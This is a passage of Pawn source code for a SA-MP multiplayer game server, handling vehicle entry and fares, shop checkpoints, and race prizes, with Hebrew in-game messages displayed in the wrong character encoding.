		SetPlayerInterior(playerid,0);
		monsterinfo[1]--;
		playerinfo[playerid][inact] = 0;
		PlayerPlaySound(playerid,1086,0.0,0.0,0.0);
		if(monsterinfo[1] == 1)
		{
			for(new i=0;i<MAX_PLAYERS;i++)
			{
				if(IsPlayerConnected(i) && playerinfo[i][inmonster])
				{
					format(string,sizeof(string),"~r~%s ~n~~w~is the winner in the ~p~monster~w~!",GetName(i));
					MovingText(string,mt_activity);
					format(string,sizeof(string)," !Monster ðéöç áúçøåú ä %s",GetName(i));
					SendClientMessageToAll(yellow,string);
					SetPlayerInterior(i,0);
					DestroyVehicleEx(playerinfo[i][monsterv]);
					SpawnPlayer(i);
					GiveMoney(i,25000);
					playerinfo[i][inmonster] = 0, playerinfo[i][waitmonster] = 0;
					monsterinfo[0] = 0, monsterinfo[1] = 0, monsterinfo[2] = 0;
					playerinfo[i][inact] = 0;
					KillTimer(monsterinfo[3]);
					PlayerPlaySound(i,1086,0.0,0.0,0.0);
				}
			}
		}
	}
	if(playerinfo[playerid][waitrace])
	{
        raceinfo[1]--;
        playerinfo[playerid][inrace] = 0;
        playerinfo[playerid][inact] = 0;
        playerinfo[playerid][waitrace] = 0;
		SendClientMessage(playerid,red," .éöàú îäøëá ùàéúå ðøùîú ìîéøåõ åìëï ìà úùåâø ìîéøåõ");
	}
	if(debugstate) printf("OnPlayerExitVehicle(%s(%d),%s(%d)) end",GetName(playerid),playerid,GetVehicleName(vehicleid),vehicleid);
	return 1;
}
//=[OnPlayerStateChange]========================================================
public OnPlayerStateChange(playerid, newstate, oldstate)
{
	if(debugstate) printf("OnPlayerStateChange(%s(%d),%d,%d) start",GetName(playerid),playerid,newstate,oldstate);
	UpdatePlayerWeapons(playerid);
	playerinfo[playerid][wcwarns]--;
	if(newstate == PLAYER_STATE_DRIVER && (GetPlayerVehicleID(playerid) == 420 || GetPlayerVehicleID(playerid) == 438)) GivePlayerMoney(playerid,-12);
	if(newstate == PLAYER_STATE_ONFOOT || newstate == PLAYER_STATE_SPAWNED || (newstate == PLAYER_STATE_EXIT_VEHICLE && (oldstate == PLAYER_STATE_DRIVER || oldstate == PLAYER_STATE_PASSENGER))) for(new i=0;i<MAX_PLAYERS;i++) if(playerinfo[i][spectate] == playerid) PlayerSpectatePlayer(i,playerid);
	if(newstate == PLAYER_STATE_DRIVER || newstate == PLAYER_STATE_PASSENGER)
	{
		for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && playerinfo[i][spectate] == playerid) PlayerSpectateVehicle(i,GetPlayerVehicleID(playerid));
		new v[M_S];
		format(v,sizeof(v),"~y~~h~%s",GetVehicleName(GetVehicleModel(GetPlayerVehicleID(playerid))));
		GameTextForPlayer(playerid,v,2500,1);
		vehicleinfo[GetPlayerVehicleID(playerid)][lastdriver] = playerid;
		if(playerinfo[playerid][pet][2])
		{
			new Float:p[4];
			GetPlayerPos(playerid,p[0],p[1],p[2]);
			GetPlayerFacingAngle(playerid,p[3]);
			if(IsValidSObject(playerinfo[playerid][pet][1])) DestroySObject(playerinfo[playerid][pet][1]);
			playerinfo[playerid][pet][2] = 0;
			if(playerinfo[playerid][pet][3]) KillTimer(playerinfo[playerid][pet][4]);
			playerinfo[playerid][pet][3] = 0;
		}
		if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 416)
		{
			new Float:h;
			GetPlayerHealth(playerid,h);
			playerinfo[playerid][lasthealth] = h;
		}
		if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 427)
		{
			new Float:a;
			GetPlayerArmour(playerid,a);
			playerinfo[playerid][lastarmour] = a;
		}
	}
	if(newstate == PLAYER_STATE_PASSENGER)
	{
		new string[M_S], am = 0, count = 0;
		if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 420)
		{
			for(new i=0;i<MAX_PLAYERS;i++)
			{
				if(IsPlayerConnected(i) && playerinfo[i][work] == work_taxi && IsPlayerInVehicle(i,GetPlayerVehicleID(playerid)))
				{
				    if(GetPlayerMoney(playerid) < playerinfo[i][drivecost])
				    {
				        SendClientMessage(playerid,red," .àéï ìê îñôé÷ ëñó ìîåðéú");
				        RemovePlayerFromVehicle(playerid);
				    }
				    else
				    {
						GiveMoney(i,playerinfo[i][drivecost]);
						SendClientMessage(i,yellow," !÷éáìú ëñó îäðåñò");
						am = playerinfo[i][drivecost];
						count++;
					}
				}
			}
			if(count > 0)
			{
				format(string,sizeof(string)," .ùéìîú %d$ ìðäâ äîåðéú",am);
				SendClientMessage(playerid,yellow,string);
				GiveMoney(playerid,0-am);
			}
		}
		else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 431)
		{
			for(new i=0;i<MAX_PLAYERS;i++)
			{
				if(IsPlayerConnected(i) && playerinfo[i][work] == work_bus && IsPlayerInVehicle(i,GetPlayerVehicleID(playerid)))
				{
				    if(GetPlayerMoney(playerid) < playerinfo[i][drivecost])
				    {
				        SendClientMessage(playerid,red," .àéï ìê îñôé÷ ëñó ìàåèåáåñ");
				        RemovePlayerFromVehicle(playerid);
				    }
				    else
				    {
						GiveMoney(i,playerinfo[i][drivecost]);
						SendClientMessage(i,yellow," !÷éáìú ëñó îäðåñò");
						am = playerinfo[i][drivecost];
						count++;
					}
				}
			}
			if(count > 0)
			{
				format(string,sizeof(string)," .ùéìîú %d$ ìðäâ äàåèåáåñ",am);
				SendClientMessage(playerid,yellow,string);
				GiveMoney(playerid,0-am);
			}
		}
		else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 0)
		{
			for(new i=0;i<MAX_PLAYERS;i++)
			{
				if(IsPlayerConnected(i) && playerinfo[i][work] == work_train && IsPlayerInVehicle(i,GetPlayerVehicleID(playerid)))
				{
				    if(GetPlayerMoney(playerid) < playerinfo[i][drivecost])
				    {
				        SendClientMessage(playerid,red," .àéï ìê îñôé÷ ëñó ìøëáú");
				        RemovePlayerFromVehicle(playerid);
				    }
				    else
				    {
						GiveMoney(i,playerinfo[i][drivecost]);
						SendClientMessage(i,yellow," !÷éáìú ëñó îäðåñò");
						am = playerinfo[i][drivecost];
						count++;
					}
				}
			}
			if(count > 0)
			{
				format(string,sizeof(string)," .ùéìîú %d$ ìðäâ äøëáú",am);
				SendClientMessage(playerid,yellow,string);
				GiveMoney(playerid,0-am);
			}
		}
		else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 487)
		{
			for(new i=0;i<MAX_PLAYERS;i++)
			{
				if(IsPlayerConnected(i) && playerinfo[i][work] == work_pilot && IsPlayerInVehicle(i,GetPlayerVehicleID(playerid)))
				{
				    if(GetPlayerMoney(playerid) < playerinfo[i][drivecost])
				    {
				        SendClientMessage(playerid,red," .àéï ìê îñôé÷ ëñó ìèééñ");
				        RemovePlayerFromVehicle(playerid);
				    }
				    else
				    {
						GiveMoney(i,playerinfo[i][drivecost]);
						SendClientMessage(i,yellow," !÷éáìú ëñó îäðåñò");
						am = playerinfo[i][drivecost];
						count++;
					}
				}
			}
			if(count > 0)
			{
				format(string,sizeof(string)," .ùéìîú %d$ ìèééñ",am);
				SendClientMessage(playerid,yellow,string);
				GiveMoney(playerid,0-am);
			}
		}
	}
	if(oldstate == PLAYER_STATE_DRIVER && playerinfo[playerid][work] == work_doctor) ExitWork(playerid," ìà ðîöà áàîáåìðñ");
	if(oldstate == PLAYER_STATE_DRIVER && playerinfo[playerid][work] == work_taxi) ExitWork(playerid," ìà ðîöà áîåðéú");
	if(oldstate == PLAYER_STATE_DRIVER && playerinfo[playerid][work] == work_bus) ExitWork(playerid," ìà ðîöà áàåèåáåñ");
	if(oldstate == PLAYER_STATE_DRIVER && playerinfo[playerid][work] == work_train) ExitWork(playerid," ìà ðîöà áøëáú");
	if(oldstate == PLAYER_STATE_DRIVER && playerinfo[playerid][work] == work_pilot) ExitWork(playerid," ìà ðîöà áäìé÷åôèø");
	if(oldstate == PLAYER_STATE_DRIVER && playerinfo[playerid][work] == work_icecream) ExitWork(playerid," ìà ðîöà áàåèå âìéãä");
	if(newstate == PLAYER_STATE_DRIVER && vehicleinfo[GetPlayerVehicleID(playerid)][store])
	{
		new vnumber[M_S], string[M_S];
		if(playerinfo[playerid][vehicle] == GetPlayerVehicleID(playerid))
		{
			format(string,sizeof(string)," .ùìê %s áøåê äáà ì",GetVehicleName(GetVehicleModel(GetPlayerVehicleID(playerid))));
			SendClientMessage(playerid,yellow,string);
			return 1;
		}
		format(vnumber,sizeof(vnumber),"Vehicle%d",GetPlayerVehicleID(playerid));
		SendClientMessage(playerid,yellow," .äîëåðéú äæå ùééëú ìçðåú äîëåðéåú");
		if(equal(fgetstring(file_vstore,vnumber),"None")) format(string,sizeof(string)," .äéà ìà ð÷ðúä òì éãé àó àçã åìëï úåëì ì÷ðåú àåúä, áîçéø %d$",vehicleinfo[GetPlayerVehicleID(playerid)][storecost]);
		else
		{
			RemovePlayerFromVehicle(playerid);
			format(string,sizeof(string)," .åìëï ìà úåëì ì÷ðåú àåúä àå ìðäåâ áä %s äéà ðé÷ðúä òì éãéé",fgetstring(file_vstore,vnumber));
		}
		SendClientMessage(playerid,yellow,string);
	}
	if(newstate == PLAYER_STATE_DRIVER && vehicleinfo[GetPlayerVehicleID(playerid)][vevip] && !playerinfo[playerid][vip])
	{
		SendClientMessage(playerid,red," .ìðäéâä áøëá æä VIP òìéê ìäéåú îùúîù");
		RemovePlayerFromVehicle(playerid);
	}
	if(newstate == PLAYER_STATE_DRIVER)
	{
		switch(GetVehicleModel(GetPlayerVehicleID(playerid)))
		{
			case 447:
			{
				if(playerinfo[playerid][level] < 7 && !IsPlayerMAdmin(playerid))
				{
					SendClientMessage(playerid,red," .òìéê ìäéåú áøîä 7 áëãé ìðäåâ áøëá äæä");
					RemovePlayerFromVehicle(playerid);
				}
			}
			case 432, 425, 520:
			{
				if(playerinfo[playerid][level] < 13 && !IsPlayerMAdmin(playerid))
				{
					SendClientMessage(playerid,red," .òìéê ìäéåú áøîä 13 áëãé ìðäåâ áøëá äæä");
					RemovePlayerFromVehicle(playerid);
				}
			}
		}
	}
	if(newstate == PLAYER_STATE_DRIVER && playerinfo[playerid][abf][0]) playerinfo[playerid][abf][1] = GetPlayerVehicleID(playerid);
	if(newstate == PLAYER_STATE_ONFOOT && oldstate == PLAYER_STATE_DRIVER && IsPlayerMAdmin(playerid) && playerinfo[playerid][abf][0] && playerinfo[playerid][abf][1] != INVALID_VEHICLE_ID) PutPlayerInVehicle(playerid,playerinfo[playerid][abf][1],0);
	if(playerinfo[playerid][spectate] != -1 && oldstate == PLAYER_STATE_SPECTATING && newstate == PLAYER_STATE_SPAWNED) LoadPlayerPos(playerid);
	if(debugstate) printf("OnPlayerStateChange(%s(%d),%d,%d) end",GetName(playerid),playerid,newstate,oldstate);
	return 0;
}
//=[OnPlayerEnterCheckpoint]====================================================
public OnPlayerEnterCheckpoint(playerid)
{
	if(debugstate) printf("OnPlayerEnterCheckpoint(%s(%d)) start",GetName(playerid),playerid);
	new string[M_S];
	if(playerinfo[playerid][inarmy])
	{
		SetPlayerPos(playerid,153.02694702148,1912.9372558594,695.39367675781);
		SetPlayerInterior(playerid,0);
		DisablePlayerCheckpoint(playerid);
		LoadPlayerWeapons(playerid);
		GiveWeapon(playerid,46,0);
		SetPlayerArmedWeapon(playerid,46);
		playerinfo[playerid][inarmy] = 0;
		SendClientMessage(playerid,darkblue," !öðéçä îäðä");
	}
	if(playerinfo[playerid][inplane])
	{
		new Float:p[3];
		GetVehiclePos(npcVehicles[3],p[0],p[1],p[2]);
		SetPlayerPos(playerid,p[0],p[1],p[2]-5.0);
		SetPlayerInterior(playerid,0);
		DisablePlayerCheckpoint(playerid);
		LoadPlayerWeapons(playerid);
		GiveWeapon(playerid,46,0);
		SetPlayerArmedWeapon(playerid,46);
		playerinfo[playerid][inplane] = 0;
		SendClientMessage(playerid,darkblue," !öðéçä îäðä");
	}
	if(playerinfo[playerid][inshooting] != -1)
	{
		GiveMoney(playerid,3000);
		format(string,sizeof(string),"  !äöìéç ìòáåø àú àéæåø ä÷ìéòä ìîèøä îñôø #%d %s",playerinfo[playerid][inshooting] + 1,GetName(playerid));
		SendClientMessage(playerid,green,string);
		LoadPlayerWeapons(playerid);
		SpawnPlayer(playerid);
		playerinfo[playerid][inshooting] = -1;
	}
	if(playerinfo[playerid][incp] == 0)
	{
		switch(GetPlayerCheckpoint(playerid))
		{
			case cp_bank:
			{
				SendClientMessage(playerid,lightblue," ~~~ :áøåëéí äáàéí ìáð÷ ~~~");
				SendClientMessage(playerid,orange," .ëàï úåëì ìùîåø àú ëñôê");
				SendClientMessage(playerid,yellow," :ô÷åãåú áð÷ àôùøéåú");
				SendClientMessage(playerid,yellow," /baccount  /deposit  /withdraw  /transfer  /balance  /depositall  /withdrawall");
				SendClientMessage(playerid,yellow," /transferall  /rmmflv  /buycc  /sellcc  /sdbox");
				if(playerinfo[playerid][gang] != 0)
				{
					SendClientMessage(playerid,yellow," :ô÷åãåú áð÷ ëðåôééä àôùøéåú");
					SendClientMessage(playerid,yellow," /gdeposit  /gwithdraw  /gbalance  /gdepositall  /gwithdrawall");
				}
				SendClientMessage(playerid,purple,"  /bmenu - òì îðú ì÷áì úôøéè ðåç ìùéîåù ááð÷, äùúîù áô÷åãä");
				SendClientMessage(playerid,purple,"  òì îðú ì÷áì øùéîú ôòåìåú áð÷ ìáéöåò àéúí (Tab) ìçöå òì ùç÷ðéí áøùéîú äùç÷ðéí");
			}
			case cp_ammu:
			{
				SendClientMessage(playerid,lightblue," ~~~ :áøåëéí äáàéí ìçðåú äðù÷éí äúîéãééí ~~~");
				SendClientMessage(playerid,orange," .ëàï úåëì ì÷ðåú ðù÷éí ùééùîøå âí ìàçø ùúîåú");
				SendClientMessage(playerid,yellow," :ô÷åãåú ðù÷éí àôùøéåú");
				SendClientMessage(playerid,yellow," /bw  /wl  /resetw  /ccbw");
				SendClientMessage(playerid,purple,"  /wmenu - òì îðú ì÷áì úôøéè ðåç ìùéîåù áçðåú äðù÷éí, äùúîù áô÷åãä");
			}
			case cp_wang:
			{
				if(wangv == -1) return SendClientMessage(playerid,red," .îåñê ååàðâ ìà îçôù ùåí øëá ëòú");
				if(IsPlayerInAnyVehicle(playerid))
				{
					if(GetVehicleModel(GetPlayerVehicleID(playerid)) == GetVehicleModel(wangv))
					{
						new pay = (randomEx(1,20)*500);
						format(string,sizeof(string)," .÷éáìú %d$ òì îëéøú äøëá",pay);
						SendClientMessage(playerid,green,string);
						GiveMoney(playerid,pay);
						SetVehicleToRespawn(GetPlayerVehicleID(playerid));
						wangv = -1;
					}
					else
					{
						format(string,sizeof(string)," .%s ìà ,%s îåñê ååàðâ îçôù",GetVehicleName(GetVehicleModel(GetPlayerVehicleID(playerid))),GetVehicleName(GetVehicleModel(wangv)));
						SendClientMessage(playerid,red,string);
					}
				}
				else
				{
					format(string,sizeof(string)," .%s îåñê ååàðâ îçôù",GetVehicleName(GetVehicleModel(wangv)));
					SendClientMessage(playerid,green,string);
				}
			}
			case cp_sammu:
			{
				SendClientMessage(playerid,lightblue," ~~~ :áøåëéí äáàéí ìçðåú äðù÷éí äñåãéú ~~~");
				SendClientMessage(playerid,orange," .ëàï úåëì ì÷ðåú ðù÷éí ùìà ðùîøéí áîçéøéí æåìéí");
				SendClientMessage(playerid,yellow," :ô÷åãåú çðåú ðù÷éí ñåãéú àôùøéåú");
				SendClientMessage(playerid,yellow," /sbw  /swl  /ccsbw");
			}
			case cp_cbank:
			{
				format(string,sizeof(string)," ~~~ :%s áøåëéí äáàéí ìáð÷ ä÷ìàï ~~~",claninfo[cpinfo[playerinfo[playerid][cp]][cpclan]][cname]);
				SendClientMessage(playerid,lightblue,string);
				if(playerinfo[playerid][clan] == 0) return SendClientMessage(playerid,red," .àúä ìà á÷ìàï åìëï àéðê éëåì ìäùúîù ááð÷é ÷ìàðéí");
				if(cpinfo[playerinfo[playerid][cp]][cpclan] == playerinfo[playerid][clan])
				{
					SendClientMessage(playerid,orange," .ëàï úåëì ìùîåø ëñó ì÷ìàï ùìê");
					SendClientMessage(playerid,yellow," :ô÷åãåú áð÷ ëðåôééä àôùøéåú");
					SendClientMessage(playerid,yellow," /cdeposit  /cwithdraw  /cbalance  /cdepositall");
				}
				else SendClientMessage(playerid,red," .áð÷ æä ìà ùééê ì÷ìàï ùìê åìëï ìà úåëì ìäùúîù áå");
			}
			case cp_clothes:
			{
				SendClientMessage(playerid,lightblue," ~~~ :áøåëéí äáàéí ìçðåú áâãéí ~~~");
				SendClientMessage(playerid,orange," .ëàï úåëì ìäçìéó ãîåú îáìé ìîåú, áàîöòåú ô÷åãä");
				SendClientMessage(playerid,yellow," :ô÷åãåú çðåú áâãéí àôùøéåú");
				SendClientMessage(playerid,yellow," /myskin  /classes");
			}
			case cp_superbonuses:
			{
				SendClientMessage(playerid,lightblue," ~~~ :áøåëéí äáàéí ìçðåú äñåôø áåðåñéí ~~~");
				SendClientMessage(playerid,orange," .ëàï úåëìå ì÷ðåú äîåï àôùøåéåú îâðéáåú");
				SendClientMessage(playerid,yellow," :ô÷åãåú çðåú äñåôø áåðåñéí");
				SendClientMessage(playerid,yellow," /sb");
			}
			case cp_vgarage:
			{
				if(!playerinfo[playerid][vip]) return SendClientMessage(playerid,red," .ìùéîåù áîåñê æä VIP òìéê ìäéåú îùúîù");
				if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red," .òìéê ìäéåú áøëá");
				if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid,red," .òìéê ìäéåú äðäâ");
				SendClientMessage(playerid,green," !äøëá ÷éáì ùéôåø");
				/*new v = GetPlayerVehicleID(playerid), rnd = random(127), Float:lastvp[4], lastvm = GetVehicleModel(GetPlayerVehicleID(playerid));
				GetVehiclePos(v,lastvp[0],lastvp[1],lastvp[2]);
				GetVehicleZAngle(v,lastvp[3]);
				DestroyVehicleEx(v);
				v = CreateVehicleEx(lastvm,lastvp[0],lastvp[1],lastvp[2],lastvp[3],!random(2) ? random(127) : rnd,!random(2) ? random(127) : rnd);
				SetVehicleHealth(v,1000.0); Fixed by RepairVehicle */
				new v = GetPlayerVehicleID(playerid), Float:ang;
				RepairVehicle(v);
				GetVehicleZAngle(v,ang);
				SetVehicleZAngle(v,ang + 180.0);
				if(!GetVehicleType(v))
				{
					ChangeVehiclePaintjob(v,randomEx(1,4));
					if(GetVehicleComponentInSlot(v,CARMODTYPE_HYDRAULICS) < 1000) AddVehicleComponent(v,1087);
					if(GetVehicleComponentInSlot(v,CARMODTYPE_WHEELS) < 1000) AddVehicleComponent(v,1076);
				}
				if((!GetVehicleType(v) || GetVehicleType(v) == 3 || GetVehicleType(v) == 4) && GetVehicleComponentInSlot(v,CARMODTYPE_NITRO) < 1000) AddVehicleComponent(v,1010);
				//PutPlayerInVehicle(playerid,v,0);
			}
			case cp_bar:
			{
				SendClientMessage(playerid,lightblue," ~~~ :áøåëéí äáàéí ìáø ~~~");
				SendClientMessage(playerid,orange," .ëàï úåëìå ì÷ðåú îù÷àåú ùééâøîå ìëí ìäéåú ùéëåøéí");
				SendClientMessage(playerid,yellow," :ô÷åãåú äáø");
				SendClientMessage(playerid,yellow," /blist  /bbuy");
				SendClientMessage(playerid,purple," .øåöéí ìàúâø àú òöîëí? - ùúå äîåï åðñå ìðöç áîéøåõ");
			}
		}
	}
	playerinfo[playerid][incp] = 1;
	if(playerinfo[playerid][inkickstar])
	{
		PlayerPlaySound(playerid,1058,0.0,0.0,0.0);
		string = "";
		playerinfo[playerid][kickstarscore]++;
		format(string,sizeof(string),"~n~~n~~n~~n~~n~~n~~r~~p~kickstar score: ~w~%d",playerinfo[playerid][kickstarscore]);
		if(IsPlayerInAnyVehicle(playerid)) RepairVehicle(GetPlayerVehicleID(playerid));
		GameTextForPlayer(playerid,string,750,3);
		new rnd = -1, tests = 0;
		do
		{
			if(tests == 10) break;
			rnd = random(sizeof(Kickstar)), tests++;
		}
		while rnd < 0 || rnd > sizeof(Kickstar)-1 || IsSomeoneNearKSPos(rnd);
		for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && playerinfo[i][inkickstar])
		{
			DisablePlayerCheckpoint(i);
			SetPlayerCheckpoint(i,Kickstar[rnd][0],Kickstar[rnd][1],Kickstar[rnd][2],4.5);
		}
	}
	if(debugstate) printf("OnPlayerEnterCheckpoint(%s(%d)) end",GetName(playerid),playerid);
	return 1;
}
//=[OnPlayerLeaveCheckpoint]====================================================
public OnPlayerLeaveCheckpoint(playerid)
{
	if(debugstate) printf("OnPlayerLeaveCheckpoint(%s(%d)) start",GetName(playerid),playerid);
	if(playerinfo[playerid][incp] == 1)
	{
		switch(GetPlayerCheckpoint(playerid))
		{
			case cp_bank: SendClientMessage(playerid,green," » !ìäúøàåú, çùáåï äáð÷ ùìê áðúééí ééùàø ùîåø");
			case cp_ammu: SendClientMessage(playerid,green," » !îöôéí ìøàåú àåúê ôä ùåá");
			case cp_sammu: SendClientMessage(playerid,green," » !îöôéí ìøàåú àåúê ôä ùåá! å... àì úñôø ùøàéú àú äçðåú, äéà ñåãéú");
			case cp_clothes: SendClientMessage(playerid,green," » !úåãä òì áé÷åøê áçðåú äáâãéí, áåà ìá÷ø ùåá");
			case cp_superbonuses: SendClientMessage(playerid,green," » !î÷ååéí ùðäðú îùéøåúéðå, îçëéí ìáåàê áôòí äáàä");
		}
	}
	PlayerPlaySound(playerid,1058,0.0,0.0,0.0);
	playerinfo[playerid][incp] = 0;
	if(debugstate) printf("OnPlayerLeaveCheckpoint(%s(%d)) end",GetName(playerid),playerid);
	return 1;
}
//=[OnPlayerEnterRaceCheckpoint]================================================
public OnPlayerEnterRaceCheckpoint(playerid)
{
	if(debugstate) printf("OnPlayerEnterRaceCheckpoint(%s(%d)) start",GetName(playerid),playerid);
	new string[M_S];
	PlayerPlaySound(playerid,1058,0.0,0.0,0.0);
	if(playerinfo[playerid][inrace])
	{
		DisablePlayerRaceCheckpoint(playerid);
		new maxcp = 0;
		switch(raceinfo[4])
		{
			case race1_cars, race5_crazy:
			{
				if(raceinfo[6] == 1) maxcp = sizeof(RacePositions_cars1)-1;
				else if(raceinfo[6] == 2) maxcp = sizeof(RacePositions_cars2)-1;
				else if(raceinfo[6] == 3) maxcp = sizeof(RacePositions_cars3)-1;
			}
			case race2_bikes:
			{
				if(raceinfo[6] == 1) maxcp = sizeof(RacePositions_bikes1)-1;
				else if(raceinfo[6] == 2) maxcp = sizeof(RacePositions_bikes2)-1;
				else if(raceinfo[6] == 3) maxcp = sizeof(RacePositions_bikes3)-1;
			}
			case race3_planes:
			{
				if(raceinfo[6] == 1) maxcp = sizeof(RacePositions_planes1)-1;
				else if(raceinfo[6] == 2) maxcp = sizeof(RacePositions_planes2)-1;
				else if(raceinfo[6] == 3) maxcp = sizeof(RacePositions_planes3)-1;
			}
			case race4_boats:
			{
				if(raceinfo[6] == 1) maxcp = sizeof(RacePositions_boats1)-1;
				else if(raceinfo[6] == 2) maxcp = sizeof(RacePositions_boats2)-1;
				else if(raceinfo[6] == 3) maxcp = sizeof(RacePositions_boats3)-1;
			}
		}
		if(playerinfo[playerid][racecp] == maxcp)
		{
			raceinfo[1]--;
			playerinfo[playerid][racecp] = 0, playerinfo[playerid][inrace] = 0, playerinfo[playerid][waitrace] = 0;
			playerinfo[playerid][inact] = 0;
			SetPlayerVirtualWorld(playerid,world_normal);
			SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),world_normal);
			PlayerPlaySound(playerid,1098,0.0,0.0,0.0);
			if(raceinfo[5] == 3)
			{
				raceinfo[5]--;
				format(string,sizeof(string)," !ðéöç áîéøåõ áî÷åí øàùåï %s",GetName(playerid));
				SendClientMessageToAll(orange,string);
				SetVehicleToRespawn(GetPlayerVehicleID(playerid));
				SpawnPlayer(playerid);
				GiveMoney(playerid,50000);
				format(string,sizeof(string),"~r~%s ~n~~w~is the winner in the ~y~race~w~!",GetName(playerid));
				MovingText(string,mt_activity);
			}
			else if(raceinfo[5] == 2)
			{
				raceinfo[5]--;
				format(string,sizeof(string)," !ðéöç áîéøåõ áî÷åí ùðé %s",GetName(playerid));
				SendClientMessageToAll(orange,string);
				SetVehicleToRespawn(GetPlayerVehicleID(playerid));
				SpawnPlayer(playerid);
				GiveMoney(playerid,25000);
			}
			else if(raceinfo[5] == 1)
			{
				raceinfo[5]--;
				format(string,sizeof(string)," !ðéöç áîéøåõ áî÷åí ùìéùé %s",GetName(playerid));
				SendClientMessageToAll(orange,string);
				SetVehicleToRespawn(GetPlayerVehicleID(playerid));
				SpawnPlayer(playerid);
				GiveMoney(playerid,10000);
				SendClientMessageToAll(orange," .äîéøåõ äñúééí");
				for(new i=0;i<MAX_PLAYERS;i++)
				{
					if(IsPlayerConnected(i) && (playerinfo[i][inrace] || playerinfo[i][waitrace]))
					{
						playerinfo[i][inrace] = 0, playerinfo[i][waitrace] = 0, playerinfo[i][racecp] = 0, playerinfo[i][raceid] = 0;
						playerinfo[i][inact] = 0;
						SetPlayerInterior(i,0);
						SetVehicleToRespawn(GetPlayerVehicleID(i));
						SpawnPlayer(i);
						SetPlayerVirtualWorld(i,world_normal);
						SetVehicleVirtualWorld(GetPlayerVehicleID(i),world_normal);
						DisablePlayerRaceCheckpoint(i);
						PlayerPlaySound(i,1098,0.0,0.0,0.0);
					}
				}
				raceinfo[0] = 0, raceinfo[1] = 0, raceinfo[2] = 0, raceinfo[4] = 99;
			}
		}
		else
		{
			if(playerinfo[playerid][racecp] == maxcp-1)
			{
				switch(raceinfo[4])
				{
					case race1_cars, race5_crazy:
					{
						if(raceinfo[6] == 1) SetPlayerRaceCheckpoint(playerid,1,RacePositions_cars1[playerinfo[playerid][racecp]][0],RacePositions_cars1[playerinfo[playerid][racecp]][1],RacePositions_cars1[playerinfo[playerid][racecp]][2],RacePositions_cars1[playerinfo[playerid][racecp]][0],RacePositions_cars1[playerinfo[playerid][racecp]][1],RacePositions_cars1[playerinfo[playerid][racecp]][2],20.0);
						else if(raceinfo[6] == 2) SetPlayerRaceCheckpoint(playerid,1,RacePositions_cars2[playerinfo[playerid][racecp]][0],RacePositions_cars2[playerinfo[playerid][racecp]][1],RacePositions_cars2[playerinfo[playerid][racecp]][2],RacePositions_cars2[playerinfo[playerid][racecp]][0],RacePositions_cars2[playerinfo[playerid][racecp]][1],RacePositions_cars2[playerinfo[playerid][racecp]][2],20.0);
						else if(raceinfo[6] == 3) SetPlayerRaceCheckpoint(playerid,1,RacePositions_cars3[playerinfo[playerid][racecp]][0],RacePositions_cars3[playerinfo[playerid][racecp]][1],RacePositions_cars3[playerinfo[playerid][racecp]][2],RacePositions_cars3[playerinfo[playerid][racecp]][0],RacePositions_cars3[playerinfo[playerid][racecp]][1],RacePositions_cars3[playerinfo[playerid][racecp]][2],20.0);
					}
					case race2_bikes:
					{
						if(raceinfo[6] == 1) SetPlayerRaceCheckpoint(playerid,1,RacePositions_bikes1[playerinfo[playerid][racecp]][0],RacePositions_bikes1[playerinfo[playerid][racecp]][1],RacePositions_bikes1[playerinfo[playerid][racecp]][2],RacePositions_bikes1[playerinfo[playerid][racecp]][0],RacePositions_bikes1[playerinfo[playerid][racecp]][1],RacePositions_bikes1[playerinfo[playerid][racecp]][2],20.0);
						else if(raceinfo[6] == 2) SetPlayerRaceCheckpoint(playerid,1,RacePositions_bikes2[playerinfo[playerid][racecp]][0],RacePositions_bikes2[playerinfo[playerid][racecp]][1],RacePositions_bikes2[playerinfo[playerid][racecp]][2],RacePositions_bikes2[playerinfo[playerid][racecp]][0],RacePositions_bikes2[playerinfo[playerid][racecp]][1],RacePositions_bikes2[playerinfo[playerid][racecp]][2],20.0);
						else if(raceinfo[6] == 3) SetPlayerRaceCheckpoint(playerid,1,RacePositions_bikes3[playerinfo[playerid][racecp]][0],RacePositions_bikes3[playerinfo[playerid][racecp]][1],RacePositions_bikes3[playerinfo[playerid][racecp]][2],RacePositions_bikes3[playerinfo[playerid][racecp]][0],RacePositions_bikes3[playerinfo[playerid][racecp]][1],RacePositions_bikes3[playerinfo[playerid][racecp]][2],20.0);
					}
					case race3_planes:
					{
						if(raceinfo[6] == 1) SetPlayerRaceCheckpoint(playerid,4,RacePositions_planes1[playerinfo[playerid][racecp]][0],RacePositions_planes1[playerinfo[playerid][racecp]][1],RacePositions_planes1[playerinfo[playerid][racecp]][2],RacePositions_planes1[playerinfo[playerid][racecp]][0],RacePositions_planes1[playerinfo[playerid][racecp]][1],RacePositions_planes1[playerinfo[playerid][racecp]][2],20.0);
						else if(raceinfo[6] == 2) SetPlayerRaceCheckpoint(playerid,4,RacePositions_planes2[playerinfo[playerid][racecp]][0],RacePositions_planes2[playerinfo[playerid][racecp]][1],RacePositions_planes2[playerinfo[playerid][racecp]][2],RacePositions_planes2[playerinfo[playerid][racecp]][0],RacePositions_planes2[playerinfo[playerid][racecp]][1],RacePositions_planes2[playerinfo[playerid][racecp]][2],20.0);
						else if(raceinfo[6] == 3) SetPlayerRaceCheckpoint(playerid,4,RacePositions_planes3[playerinfo[playerid][racecp]][0],RacePositions_planes3[playerinfo[playerid][racecp]][1],RacePositions_planes3[playerinfo[playerid][racecp]][2],RacePositions_planes3[playerinfo[playerid][racecp]][0],RacePositions_planes3[playerinfo[playerid][racecp]][1],RacePositions_planes3[playerinfo[playerid][racecp]][2],20.0);
					}
					case race4_boats:
					{
